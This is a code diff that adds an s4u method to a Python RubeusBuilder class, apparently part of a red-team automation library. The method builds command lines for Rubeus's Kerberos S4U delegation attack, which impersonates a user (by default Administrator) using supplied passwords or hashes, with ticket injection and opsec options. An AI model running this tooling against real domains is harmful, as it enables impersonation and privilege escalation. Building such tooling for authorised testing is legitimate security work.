@@ -153,3 +153,52 @@ class RubeusBuilder:
         if ptt:
             argv.append("/ptt")
         return argv
+
+    def s4u(
+        self,
+        *,
+        user: str,
+        impersonateuser: str = "Administrator",
+        msdsspn: str,
+        domain: str | None = None,
+        dc: str | None = None,
+        ticket: str | None = None,
+        password: str | SecretStr | None = None,
+        rc4: str | SecretStr | None = None,
+        aes256: str | SecretStr | None = None,
+        altservice: str | None = None,
+        ptt: bool = False,
+        outfile: str | None = None,
+        opsec: bool = False,
+    ) -> list[str]:
+        argv = [
+            self.binary,
+            "s4u",
+            f"/user:{user}",
+            f"/impersonateuser:{impersonateuser}",
+            f"/msdsspn:{msdsspn}",
+        ]
+        if domain:
+            argv.append(f"/domain:{domain}")
+        if dc:
+            argv.append(f"/dc:{dc}")
+        if ticket:
+            argv.append(f"/ticket:{ticket}")
+        pw = secret_value(password)
+        if pw:
+            argv.append(f"/password:{pw}")
+        h_rc4 = secret_value(rc4)
+        if h_rc4:
+            argv.append(f"/rc4:{h_rc4}")
+        h_aes = secret_value(aes256)
+        if h_aes:
+            argv.append(f"/aes256:{h_aes}")
+        if altservice:
+            argv.append(f"/altservice:{altservice}")
+        if ptt:
+            argv.append("/ptt")
+        if outfile:
+            argv.append(f"/outfile:{outfile}")
+        if opsec:
+            argv.append("/opsec")
+        return argv
